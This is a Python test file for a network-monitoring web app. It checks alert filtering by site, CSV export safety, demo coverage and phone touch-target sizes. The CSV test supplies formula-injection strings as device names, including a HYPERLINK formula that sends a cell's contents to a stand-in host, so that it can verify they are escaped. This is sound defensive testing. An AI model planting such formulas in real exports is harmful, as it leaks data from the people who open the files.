"""API views follow the building filter the same way on every screen."""
import json
import os
import sys
import threading
import time
import types
from unittest import mock
import unittest
import urllib.parse
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

APP = Path(__file__).resolve().parent.parent / "cockpit" / "app"
sys.path.insert(0, str(APP))


class AlertsFollowBuildingFilter(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        import importlib
        os.environ["COCKPIT_AUTH"] = "off"
        import auth
        importlib.reload(auth)
        import main
        cls.main = main
        nodes = {
            "a1": {"id": "a1", "name": "SRV-A", "ip": "192.0.2.10", "site": "Site A"},
            "b1": {"id": "b1", "name": "PRN-B", "ip": "198.51.100.20", "site": "Site B"},
        }
        alerts = [
            {"name": "Down", "severity": "critical", "node": "a1", "source": "Prometheus", "since": 1},
            {"name": "Paper", "severity": "warning", "node": "b1", "source": "Prometheus", "since": 2},
        ]
        mdl = types.SimpleNamespace(nodes=nodes)
        cls._saved = dict(main._cache)
        main._cache.update(t=time.time() + 3600, model=mdl, live={"alerts": alerts})
        cls.srv = ThreadingHTTPServer(("127.0.0.1", 0), main.Handler)
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()
        cls.srv.server_close()
        cls.main._cache.clear()
        cls.main._cache.update(cls._saved)

    def names(self, site=None):
        q = "?site=" + urllib.parse.quote(site) if site else ""
        with urllib.request.urlopen(f"http://127.0.0.1:{self.srv.server_address[1]}/api/alerts{q}", timeout=5) as r:
            return sorted(a["name"] for a in json.load(r)["alerts"])

    def test_all_buildings(self):
        self.assertEqual(self.names(), ["Down", "Paper"])

    def test_one_building(self):
        self.assertEqual(self.names("Site B"), ["Paper"])
        self.assertEqual(self.names("Site A"), ["Down"])


class InventoryCsv(unittest.TestCase):
    def test_names_from_the_network_are_never_spreadsheet_formulas(self):
        # Any machine can announce a NetBIOS or DNS name; opened in Excel or LibreOffice it must stay text.
        import main
        rows = [{"status": "up", "name": "=HYPERLINK(\"http://198.51.100.7/?x=\"&E2,\"Open\")", "netbios": "+1+cmd",
                 "dns": "@SUM(1)", "os": "-2+3", "vendor": "\tTab", "ip": "192.0.2.9", "sources": "scan"}]
        with mock.patch.object(main, "current", return_value=(None, None)), mock.patch.object(main.M, "inventory", return_value=rows):
            text = main.inventory_csv()
        line = text.splitlines()[1]
        for cell in line.split(";"):
            self.assertFalse(cell.lstrip('"')[:1] in ("=", "+", "-", "@", "\t"), line)
        self.assertIn("'=HYPERLINK", line)
        self.assertIn("192.0.2.9", line)


class OnlineDemo(unittest.TestCase):
    def test_every_screen_call_is_recorded_for_the_online_demo(self):
        import re
        root = APP.parent.parent
        used = set()
        for js in (root / "cockpit" / "static").glob("*.js"):
            used |= set(re.findall(r"[\"`]api/([a-z]+)(?=[\"`?])", js.read_text(encoding="utf-8")))
        build = (root / "scripts" / "build_pages_demo.py").read_text(encoding="utf-8")
        recorded = set(re.findall(r'"([a-z]+)"', build[build.index("for name in ("):build.index("for s in sites")]))
        handled = {"node", "ai", "rescan", "login", "logout"}   # recorded per device / answered by the shim / never in the demo
        self.assertEqual(sorted(used - recorded - handled), [])


class Phone(unittest.TestCase):
    def test_touch_targets_are_at_least_40px_high_on_phones(self):
        # measured with Playwright at 390x844: chips, small buttons and the AI button were 26-30 px high
        css = (APP.parent / "static" / "style.css").read_text(encoding="utf-8")
        phone = css[css.index("@media (max-width: 760px)"):]
        phone = phone[:phone.index("@media (prefers-reduced-motion")]
        self.assertRegex(phone, r"\.chip, button\.sm, button\.ai, \.site-chip \{ min-height: 40px;")


if __name__ == "__main__":
    unittest.main()
